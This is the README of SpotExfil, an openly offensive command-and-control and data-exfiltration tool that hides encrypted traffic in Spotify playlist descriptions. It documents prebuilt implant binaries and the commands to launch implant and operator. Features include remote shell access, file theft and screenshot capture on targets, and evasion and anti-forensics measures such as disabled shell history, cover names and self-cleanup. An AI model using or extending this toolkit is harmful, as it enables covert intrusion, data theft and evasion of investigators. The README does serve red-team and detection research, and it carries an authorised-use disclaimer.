<div align="center">

```
███████╗██████╗  ██████╗ ████████╗███████╗██╗  ██╗███████╗██╗██╗
██╔════╝██╔══██╗██╔═══██╗╚══██╔══╝██╔════╝╚██╗██╔╝██╔════╝██║██║
███████╗██████╔╝██║   ██║   ██║   █████╗   ╚███╔╝ █████╗  ██║██║
╚════██║██╔═══╝ ██║   ██║   ██║   ██╔══╝   ██╔██╗ ██╔══╝  ██║██║
███████║██║     ╚██████╔╝   ██║   ███████╗██╔╝ ██╗██║     ██║███████╗
╚══════╝╚═╝      ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝
```

### Covert data exfiltration & C2 over Spotify playlist descriptions

[![CodeQL](https://github.com/sourcefrenchy/spotexfil/actions/workflows/codeql-analysis.yml/badge.svg)](https://github.com/sourcefrenchy/spotexfil/actions/workflows/codeql-analysis.yml)

</div>

# SpotExfil

A proof-of-concept covert channel and C2 framework that uses Spotify playlist descriptions as a communication medium, 512 characters at a time.

Implemented in **Go** — a single standalone binary with no runtime dependencies.

More info at [Exfiltration Series: SpotExfil](https://medium.com/@jeanmichel.amblat/exfiltration-series-spotexfil-9aee76382b74)

## Features

### Encryption and Opsec
- **AES-256-GCM encryption** with PBKDF2-SHA256 key derivation (480K iterations)
- **Rotating HMAC tags** -- C2 playlist identifiers rotate hourly, preventing long-term traffic correlation
- **Auto-generated session keys** -- implant generates a NATO-phonetic passphrase on startup (never in argv)
- **Session binding** -- all commands/results tied to a crypto-random session ID, preventing replay
- **Timestamp validation** -- commands older than 5 minutes are rejected
- **HMAC-SHA256 client IDs** -- 64-bit collision-resistant agent identifiers (keyed, unforgeable)
- **BLAKE2b integrity verification** on encode and decode
- **Gzip compression** reduces payload size 60-80% for text

### C2 Framework
- **Multi-agent support** -- `agents`, `attach <id>`, `detach` for managing multiple implants
- **Interactive shell** (`ishell`) -- remote shell with command queuing, auto-detects bash/powershell
- **Direct shell on attach** -- type commands directly when attached (no `shell` prefix needed)
- **Auto check-in** -- implants announce themselves, operator sees connections in real-time
- **Modules**: shell (exec commands), exfil (read files), push (write files to target), screenshot (screen capture), sysinfo (OS/network recon)
- **Smart rate limiting** -- exponential backoff, human-readable error messages, auto-recovery
- **Parallel uploads** -- bounded worker pool (4 workers) with per-chunk retries, ~4x faster large sends
- **Cached cover traffic** -- filler-track artist lookup resolved once per process, not per playlist

### Infrastructure
- **Standalone binary** -- no runtime needed, static Go build
- **Cross-platform binaries** -- macOS (Apple Silicon), Linux (x64), Windows (x64), stripped
- **Stealth** -- cover playlist names, random filler tracks, jittered polling, aggressive cleanup
- **Config file support** (`~/.spotexfil.conf`) so env vars are optional

## Architecture

### How it works

Spotify playlists are the mailbox: the operator and implant never talk to
each other directly — they read and write encrypted chunks in playlist
descriptions on a shared Spotify account, and delete each playlist right
after reading it.

```
     OPERATOR                    SPOTIFY ACCOUNT                  IMPLANT
  (c2-operator)             private playlists = mailbox        (c2-implant)
        │                           │                               │
        │                           │◄──── 1. checkin ──────────────│  jittered
        │                           │   ("res" box, master key,     │  poll loop
        │◄─── poll ─────────────────│    hostname, os, user,        │  starts
        │    sees new agent         │    X25519 pubkey)             │
        │                           │                               │
        │──── 2. keyexchange ──────►│───── poll ───────────────────►│
        │   ("cmd" box, master key, │                               │ 3. ECDH +
        │    operator X25519 pubkey)│                               │    HKDF
        │                           │                               │
        │═════════ both sides now share a session key ══════════════│
        │              (forward secrecy established)                │
        │                           │                               │
        │──── 4. command ──────────►│───── poll ───────────────────►│
        │   ("cmd" box, session key,│                               │ 5. execute
        │    seq, 5-min timestamp,  │                               │    module:
        │    session binding)       │                               │    shell /
        │                           │                               │    exfil /
        │                           │◄──── 6. result ───────────────│    push /
        │◄─── poll ─────────────────│   ("res" box, session key)    │    screenshot
        │    7. decrypt, display,   │                               │
        │    store in history       │                               │
        │                           │                               │
        ▼                playlists are deleted immediately          ▼
                      after being read (both sides)
```

Every message — command, result, checkin — goes through the same pipeline:

```
  JSON ──► gzip ──► BLAKE2b ──► AES-256-GCM ──► base64 ──► split into
   (1)      (2)       (3)           (4)           (5)      ≤300-char chunks
                                                                  │
                          one playlist per chunk                  ▼
              ┌────────────────────────────────────────────────────────┐
              │  description =                                         │
              │  ┌──────────────────────┐ ┌──────────────────────────┐ │
              │  │ HMAC tag (12 hex)    │ │ base64( AES-256-GCM(     │ │
              │  │ rotates hourly,      │ │   {"c":channel,          │ │
              │  │ identifies our       │ │    "i":chunk#,           │ │
              │  │ playlists without    │ │    "seq":msg#}           │ │
              │  │ decrypting           │ │   + chunk data ) )       │ │
              │  └──────────────────────┘ └──────────────────────────┘ │
              └────────────────────────────────────────────────────────┘

  (1) message as JSON          (4) PBKDF2(master key) or raw session key
  (2) gzip, skipped if no win  (5) the 512-char Spotify description limit
  (3) integrity hash               is what caps chunks at ~300 chars
```

Why two encryption layers? The **message layer** (4) protects the payload
end-to-end (master key before key exchange, X25519 session key after). The
**chunk layer** protects the metadata (channel, chunk index, seq) with a
fast HMAC-derived key, so a reader can identify and order chunks by tag
prefix alone — one playlist-listing API call, no per-playlist fetches.

File exfiltration mode (`send`/`receive`) uses the same pipeline without
the C2 envelope: chunks are stored with a zero-width-space marker and
`{"i":N}` ordering metadata, under innocuous cover playlist names.

### Repository layout

```
spotexfil/
├── go/
│   ├── cmd/spotexfil/       # Cobra CLI entrypoint
│   ├── internal/
│   │   ├── crypto/          # AES-GCM, PBKDF2, BLAKE2b, HMAC, X25519
│   │   │   └── testdata/    # Crypto test vectors
│   │   ├── encoding/        # File exfil pipeline
│   │   ├── protocol/        # C2 messages, encrypted descriptions
│   │   ├── shared/          # Embedded protocol.json (constants)
│   │   ├── spotify/         # zmb3/spotify/v2 wrapper
│   │   └── c2/              # Implant, operator, module registry
│   └── go.mod
├── Makefile                 # Build + test
└── README.md
```

## Prerequisites

1. Register an app at [Spotify Developer Dashboard](https://developer.spotify.com/dashboard/)
2. Add redirect URI (e.g., `http://127.0.0.1:8888/callback`)
3. Provide credentials via env vars or `~/.spotexfil.conf`:

```bash
export SPOTIFY_USERNAME=YourUsername
export SPOTIFY_CLIENT_ID=your_client_id
export SPOTIFY_CLIENT_SECRET=your_client_secret
export SPOTIFY_REDIRECTURI=http://127.0.0.1:8888/callback
```

Or create `~/.spotexfil.conf`:

```ini
[spotify]
username = YourUsername
client_id = your_client_id
client_secret = your_client_secret
redirect_uri = http://127.0.0.1:8888/callback
```

## Installation

### Pre-built binaries (no runtime needed)

Download the appropriate binary from `dist/`:
- `spotexfil-darwin-arm64` -- macOS Apple Silicon
- `spotexfil-linux-amd64` -- Linux x64
- `spotexfil-windows-amd64.exe` -- Windows x64

### Build from source

```bash
make all          # Cross-compile binaries for all platforms
make test         # Run the test suite (with race detector)
make lint         # go vet
```

## Usage

### C2 Mode

```bash
# Terminal 1: Start implant (auto-generates session key)
# Token must be pre-staged: SPOTIFY_TOKEN_JSON, --token-file, or .cache file.
# The implant NEVER runs interactive OAuth and NEVER writes a token cache.
./spotexfil-darwin-arm64 c2-implant --interval 30 --jitter 10

# Opsec flags:
#   --quiet / -q              suppress non-error output
#   --modules shell,exfil     module allowlist (e.g. disable screenshot
#                             to avoid the macOS Screen Recording prompt)
#   --token-file tok.json     pre-staged token (or SPOTIFY_TOKEN_JSON env)

# Output:
# [*] Session key: bravo-kilo-seven-echo-tango-lima
# [*] Use this key to start the operator:
#     ./spotexfil c2-operator -k "bravo-kilo-seven-echo-tango-lima"
#   Interval : 20-40s | Session : a3f2b7c91e04
#   Client ID : 7f3a2b1c9e04d8f1
#   X25519    : eb4debc295a5954dda3d...
# [*] Implant active — polling for commands
# [+] Check-in sent (7f3a2b1c) at 15:30:05
# [+] Forward secrecy established at 15:30:20

# Terminal 2: Operator (use the key shown by implant)
./spotexfil-darwin-arm64 c2-operator -k "bravo-kilo-seven-echo-tango-lima" --poll-interval 30

# Alternative: key from file or env var
./spotexfil-darwin-arm64 c2-operator --key-file /path/to/keyfile
SPOTEXFIL_KEY="bravo-kilo-seven-echo-tango-lima" ./spotexfil-darwin-arm64 c2-operator
```

### Operator Console

```
  ┌─────────────────────────────────────────────┐
  │  ___            _   ___       __ _ _        │
  │ / __|_ __  ___ | |_| __|__ _/ _(_) |       │
  │ \__ \ '_ \/ _ \|  _| _|\ \ /  _| | |      │
  │ |___/ .__/\___/ \__|___/_\_\_| |_|_|_|      │
  │     |_|                                     │
  │         C2 OPERATOR CONSOLE                 │
  └─────────────────────────────────────────────┘

  Polling every 30s | Type 'help' for commands

[+] New implant: Kepler
    alias     : Kepler
    client_id : 7f3a2b1c
    hostname  : target.local
    os        : darwin/arm64
    user      : admin
    timestamp : 2026-04-18 15:30:05

[15:30] c2> agents

  NAME       ID         OS             HOSTNAME         USER       CONNECTED
  ---------- ---------- -------------- ---------------- ---------- -------------------
  Kepler     7f3a2b1c   darwin/arm64   target.local     admin      2026-04-18 15:30:05

[15:30] c2> attach kepler
[*] Attached to Kepler (target.local)
[15:30] Kepler@target.local > whoami
[*] Command queued: seq=1 module=shell
[15:30] 7f3a2b1c@target.local > uname -a
[*] Command queued: seq=2 module=shell
[15:30] 7f3a2b1c@target.local > sysinfo
[*] Command queued: seq=3 module=sysinfo
[15:30] 7f3a2b1c@target.local > results
[15:30] 7f3a2b1c@target.local > detach
[*] Detached from 7f3a2b1c9e04d8f1 (target.local)
[15:31] c2>
```

### Interactive Shell (ishell)

```
[15:31] 7f3a2b1c@target.local > ishell

[*] Interactive shell to target.local (darwin/arm64)
[*] Shell: bash | Commands queue automatically | 'quit' to exit

7f3a2b1c@target.local $ ls -la /tmp
  -> queued seq=4
7f3a2b1c@target.local $ cat /etc/hosts
  -> queued seq=5
[queued: 2] 7f3a2b1c@target.local $

$ ls -la /tmp
drwxrwxrwt  12 root  wheel  384 Apr 18 15:31 .
...

$ cat /etc/hosts
127.0.0.1       localhost

7f3a2b1c@target.local $ quit
[*] Leaving interactive shell
```

### Available Commands

```
Agent management:
  agents          List connected implants
  attach <name>   Attach by name or ID (e.g. 'attach kepler' or 'attach 7f3a')
  detach          Detach from current agent

Commands (when attached, type directly or use prefix):
  ishell          Interactive remote shell (auto-detects bash/powershell)
  <any command>   Sent as shell command to attached agent
  exfil <path>    Exfiltrate a file
  push <l> <r>    Push local file <l> to remote path <r>
  screenshot [n]  Capture the target's screen (saved as JPEG locally)
  sysinfo         Gather system info

History:
  history         Show command history (last 20, persisted across restarts)
  shellhist       Alias for history
  result <seq>    Show detailed result for a specific seq number

Other:
  results         Poll for pending results
  wait <seq>      Wait for a specific result
  status          Show agents and pending commands
  clean           Remove all C2 playlists
  help            Show this help
  quit / exit     Exit the console
```

### Data Exfiltration Mode

```bash
# Send (encrypted + compressed, cover names)
./spotexfil-darwin-arm64 send -f /etc/resolv.conf -k "passphrase"

# Receive and decrypt
./spotexfil-darwin-arm64 receive -k "passphrase" -o output.txt

# Clean up
./spotexfil-darwin-arm64 clean
```

## Security Model

### Encryption
- All payloads: AES-256-GCM with PBKDF2-SHA256 (480K iterations)
- C2 metadata: AES-256-GCM with HMAC-derived fast key (no PBKDF2 per-playlist)
- Forward secrecy: X25519 ECDH key exchange + HKDF-SHA256 session keys
- Integrity: BLAKE2b-160 hash verified on decode

### Opsec Features
| Feature | Description |
|---------|-------------|
| Forward secrecy | X25519 ECDH per session — past traffic undecryptable even if master key leaks |
| Rotating tags | C2 playlist identifiers rotate hourly via time-windowed HMAC |
| Auto-generated keys | Implant generates NATO-phonetic passphrase (never in argv/ps) |
| Session binding | Crypto-random session ID prevents replay and cross-session leaks |
| Timestamp validation | Commands older than 5 minutes rejected |
| HMAC-SHA256 client IDs | 64-bit keyed identifiers (unforgeable without the key) |
| Heartbeat checkins | Implant re-announces every 60s so new operators see it within a minute |
| Aggressive cleanup | Playlists deleted after read; orphaned results from dead sessions cleaned |
| Plugin modules | Modules loadable as .so plugins at runtime (linux/macOS) |
| Async execution | Commands run in goroutines; large exfils don't block command processing |
| Shutdown signal | Operator broadcasts encrypted shutdown on exit, implants auto-reconnect |
| Cover names | Innocuous playlist names ("Chill Vibes #a3f2") |
| Jittered polling | Configurable interval + random jitter |
| Exponential backoff | Independent read/write backoff with auto-recovery |
| Random OAuth state | No tool fingerprint in OAuth flow |

### Implant hardening (host forensics)

Measures to minimize artifacts left on the implant host if an admin investigates:

| Measure | Detail |
|---------|--------|
| No interactive OAuth on target | Implant fails closed unless a token is pre-staged (`SPOTIFY_TOKEN_JSON`, `--token-file`, or `.cache`) — no browser, no local callback listener |
| No token cache on target | Implant never writes `.cache-<username>` (in-memory token only) |
| Self-cleanup on exit | SIGINT/SIGTERM → best-effort cleanup of its command queue + session key zeroing (Go/GC caveat: string keys can't be reliably wiped) |
| Quiet mode | `--quiet` suppresses non-error stdout (scrollback/syslog crumbs) |
| Module allowlist | `--modules shell,exfil,...` disables noisy modules — e.g. `screenshot` triggers a macOS Screen Recording (TCC) prompt |
| Shell env hardening | Commands run with `HISTFILE=/dev/null HISTSIZE=0` |
| Trimmed binaries | Built with `-trimpath -buildvcs=false -s -w` — no local build paths or VCS metadata embedded |
| Auto-generated keys | Session key never appears in argv/ps |

Note: this PoC hides traffic *content*, not *presence*. On a host where the user never runs Spotify, connections to `api.spotify.com` are themselves an anomaly.

### Resilience
- **Operator restart**: implant heartbeats every 60s, new operator picks it up automatically
- **Operator Ctrl+C** (no clean shutdown): implant continues polling, re-checkins on heartbeat
- **Wrong key then correct key**: implant is invisible to wrong-key operator, visible to correct-key operator within 60s
- **Forward secrecy trade-off**: results from a dead operator session are marked `lost` in history (encrypted with prior X25519 keys — by design). Re-send the command after reconnecting. Opt-in workaround: `c2-operator --persist-session` stores session keys encrypted on disk (`~/.spotexfil-session`, 0600, AES-GCM with an HMAC-derived key from the master key) so a restarted operator can still decrypt in-flight results — at the cost of forward secrecy across restarts.
- **Persistent history**: `~/.spotexfil-history.json` survives operator restarts. Use `history` to see all past commands/results, `result <seq>` for full details including output and latency.

### API Optimization
Spotify rate limits: ~180 requests per rolling 30-second window per app.

| | Before | After |
|---|---|---|
| API calls per poll | 1 listing + N GetPlaylist (80+ on a real account) = **81 calls** | 1 listing + client-side tag filter = **1-3 calls** |
| API calls per exfil read/clean | 1 listing + N GetPlaylist = **81 calls** | 1 listing, description read client-side = **1-3 calls** |
| API calls per playlist created | 1 create + search + top-tracks + add-tracks = **4 calls** | 1 create + 1 add-tracks (artist lookup cached once per process) = **2 calls** |
| Large payload upload | Sequential, 100ms sleep per chunk | **4 parallel workers**, per-chunk retry with server-honored backoff |
| Effective req/30s at --interval 30 | ~160 (near limit) | ~2 (well under) |
| Min safe interval | 60s+ | 20s |
| Write block behavior | Everything backs off, implant goes deaf | Reads keep polling, only writes back off independently |

The `SimplePlaylist` listing already includes the `description` field. Both C2 playlists (encrypted HMAC tag prefix) and exfil payload playlists (zero-width marker) are identified client-side from the listing — no per-playlist `GetPlaylist` calls. Personal playlists (80+) are skipped with zero API cost. A full-details fetch only happens as a fallback when a listing description is empty.

Filler-track cover traffic is resolved **once per process** (one artist search + one top-tracks call), then a shuffled subset of the cached track IDs is added to each playlist — previously 3 API calls per playlist created.

Uploads use a **bounded worker pool** (4 workers) with per-chunk retries: a failed chunk is retried up to 3 times, honoring the server-provided `Retry-After` when present, and no longer aborts the whole payload.

Read (polling for commands) and write (checkin, sending results) have **independent backoff timers**. A Spotify write block doesn't stop the implant from receiving and executing commands.

### What an analyst sees on Spotify
- Private playlists with names like "Morning Coffee #b7c2"
- Descriptions are opaque encrypted blobs (HMAC tag + AES-GCM ciphertext)
- No plaintext metadata, no sequential naming, no detectable patterns
- Playlists are deleted within seconds of being read
- HMAC tag rotates hourly — no permanent correlation across time windows

## Testing

```bash
make test         # Run all tests (go test -race)
```

Test coverage includes:
- **Crypto**: AES-GCM, PBKDF2, BLAKE2b, HMAC, X25519 ECDH, HKDF session key derivation
- **Forward secrecy**: full key exchange simulation, session isolation, forward secrecy property verification
- **Protocol resilience**: raw encode/decode, master-key fallback, operator restart scenario, implant fallback decryption
- **Module registry**: dynamic register/unregister, concurrent access (race detector)
- **Operator concurrency**: shared-state locking (agents, session keys, history) verified with `-race`; history index, cap, and save debouncing
- **Integration**: full C2 roundtrips, multi-command queue, channel isolation, cleanup
- **Stress**: 100+ random payloads, concurrent encoding, edge cases
- **Test vectors**: crypto validation against shared vectors in `go/internal/crypto/testdata/`

## Limitations

- ~1MB max payload (~2000 playlists)
- Large files take time (parallel workers help; still 1 playlist per 512-char chunk)
- Spotify rate limits: ~180 req/30s rolling window, write blocks can escalate to 24h
- C2 polling adds latency (configurable, default 20-60s)

## Disclaimer

This is a **proof-of-concept for educational and authorized security research purposes only**. Do not use for unauthorized data exfiltration or unauthorized access to computer systems. The author is not responsible for misuse.

## TODO

- Account rotation support
- Additional C2 modules (persistence, clipboard)
- Multi-account relay / dead drops
- Steganographic payload encoding
